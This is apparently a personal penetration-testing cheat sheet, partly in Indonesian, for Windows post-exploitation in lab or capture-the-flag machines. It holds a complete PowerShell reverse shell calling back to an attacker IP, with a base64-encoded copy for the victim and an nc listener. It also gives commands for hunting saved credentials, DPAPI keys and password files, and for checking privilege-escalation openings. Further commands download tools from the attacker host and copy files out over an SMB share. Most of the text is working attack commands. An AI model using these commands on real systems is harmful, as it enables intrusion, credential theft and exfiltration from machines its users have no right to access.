# 0. Reverse Shell
## a. Binary
https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.236',4447);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# encode
iconv -t UTF-16LE shell.ps1 | base64 -w 0

# on victim
powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAGMAIAAiACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADEAMAAuADEANQAuADIAMwA2ACcALAA0ADQANAA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApACIACgA=
```
![](Attachments/Pasted%20image%2020260827104202.png)
## b. Listener
```shell
rlwrap nc -lvnp 4444
```
![](Attachments/Pasted%20image%2020260629092222.png)

# 1. User.txt
## Cari User di directory lain
```powershell
# Cari di semua Desktop semua user
dir C:\Users\*\Desktop\user.txt /s /b 2>nul

# Atau lebih luas
dir C:\Users\ /s /b 2>nul | findstr /i "user.txt\|local.txt\|proof.txt"
```
# 2. Enumeration
## a. System Information
Untuk melihat ==OS Name== dan ==System Type==
```powershell
# Untuk CMD 
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

echo %PROCESSOR_ARCHITECTURE%

# Untuk Powershell
$env:PROCESSOR_ARCHITECTURE
```
![](Attachments/Pasted%20image%2020260814104031.png)
![](Attachments/Pasted%20image%2020260824130947.png)
cek windows version use `systeminfo` command
![](Attachments/Pasted%20image%2020260629103715.png)
## b. Antivirus
cek status ==RUNNING== atau tidak
```powershell
sc query windefend
```
## c. User Information
```powershell
net user <nama user>
host
whoami /priv #dahulukan ini
whoami /groups
whoami /all
```
![](Attachments/Pasted%20image%2020260625053212.png)
yang berbahaya  pada whoami /priv
- ==SeImpersonatePrivilege== -> ini yang paling bahaya

## d. Group Information
```powershell
net user
net localgroup administrators
```
![](Attachments/Pasted%20image%2020260625054311.png)
## e. Network Information
```powershell
hostname #cek komputer apa
ipconfig #cek apakah ada another network

ipconfig /all
route print
netstat -ano
arp -a
```
pada gambar dibawah ada another network
![](Attachments/Pasted%20image%2020260625053943.png)
Scan ip apa saja yang aktif
```powershell
1..255 | ForEach-Object { $ip = "192.168.100.$_"; if (Test-NetConnection -ComputerName $ip -InformationLevel Quiet -ErrorAction SilentlyContinue) { $ip } }
```
![](Attachments/Pasted%20image%2020260625094620.png)
## f. Saved Credentials
```powershell
# Windows Credential Manager entries — check this FIRST
cmdkey /list

# DPAPI-protected credential blobs                      
dir /a /s %APPDATA%\Microsoft\Credentials\
Get-ChildItem -Path $env:APPDATA\Microsoft\Credentials\ -Force -Recurse

# DPAPI masterkeys (need this to decrypt above)       
dir /a /s %APPDATA%\Microsoft\Protect\
Get-ChildItem -Path $env:APPDATA\Microsoft\Protect\ -Force -Recurse 
```
![](Attachments/Pasted%20image%2020260908105929.png)
## g. Cek Share
```powershell
cd C:\Shares\
```
## h. Password file
```powershell
# CMD
findstr /si password *.ini *.config

# powershell
Get-ChildItem -Include *.ini, *.config -Recurse | Select-String "password"

# Current folder
Select-String -Path * -Pattern "password" 

findstr /si password *.txt *.ini *.config *.xml *.ps1 2>nul
dir /s /b *pass* == *cred* == *.kdbx 2>nul
type C:\inetpub\wwwroot\web.config 2>nul                  # IIS app configs
dir C:\Windows\Panther\Unattend.xml 2>nul                 # unattended install creds
dir C:\Windows\System32\sysprep\sysprep.xml 2>nul
type C:\Windows\System32\drivers\etc\hosts                # sometimes reveals internal infra
```

## i. Cek Autoruns
```powershell
# unquoted paths + non-default binaries
wmic service get name,pathname,startmode,startname | findstr /i /v "C:\Windows"  

# scheduled tasks
schtasks /query /fo LIST /v                                                        
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
# 3. Schedule Task
## Siapa yang menjalankan program UpdateChecker Agent (misal)?
```powershell
# Versi CMD  
schtasks /query /tn "UpdateChecker Agent" /fo list /v  
  
# Versi Powershell  
Get-ScheduledTask -TaskName "UpdateChecker Agent"  
  
# Versi Manual  
$s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.GetFolder("\").GetTask("UpdateChecker Agent").Definition.Principal
```
![](Attachments/Pasted%20image%2020260704110707.png)
## Apa yang dijalankkanya?
```powershell
$s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.GetFolder("\").GetTask("UpdateChecker Agent").Definition.Actions 
```
![](Attachments/Pasted%20image%2020260704110800.png)
# 4. Transfer File
## a. Download
```powershell
download "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"
```
## b. Upload
### i. Dari evil-winrm
```powershell
upload '/home/kali/forensic-tools/volatility3-win-exes-2.28.0/vol.exe' 'C:\Windows\Temp\vol.exe'

upload '/home/kali/ligolo/ligolo-agent.exe' 'C:\Windows\Temp\ligolo-agent.exe'

# Verify
ls C:\Windows\Temp\vol.exe
```
### ii. Dari RCE
```shell
# Attacker machine
python3 -m http.server 8088

# Victimm machine
wget http://10.10.14.38:8088/<file>

# kalau filenya besar
certutil -urlcache -split -f http://10.10.14.38:8088/Rubeus.exe Rubeus.exe

# alternative powershell
iwr -uri http://10.10.16.84:9090/Settings_Update.zip -OutFile Settings_Update.zip

```
## c. Sent data from RCE shell
```powershell
# set smb file di kali
sudo impacket-smbserver share . -smb2support -username test -password test

# kirim dari windows
net use \\10.10.15.236\share /user:test test
copy SmarterMail.Standard.dll \\10.10.15.236\share\

# Convert Base64
sudo impacket-smbserver share . -smb2support -username test -password test
```
![](Attachments/Pasted%20image%2020260901142257.png)
![](Attachments/Pasted%20image%2020260901142402.png)
# 5. Powershell
## a. Menjalankan powershell tanpa restriction
```
powershell -ep bypass
```
## b. Version Powershell
```powershell
$PSVersionTable
```
![](Attachments/Pasted%20image%2020260824123528.png)
# 6. Search
search file yang mengandung string system
```powershell
# innercase
netstat -ano | findstr /i system 

# mirip grep
Get-ChildItem -Path C:\ -Recurse -Filter "*smartermail*" -ErrorAction SilentlyContinue -Force | Select-Object FullName
```
![](Attachments/Pasted%20image%2020260826103714.png)
# 7. Curl
```shell
Invoke-WebRequest -Uri http://localhost:17017 -UseBasicParsing | Select-Object -ExpandProperty Content
```
![](Attachments/Pasted%20image%2020260826111227.png)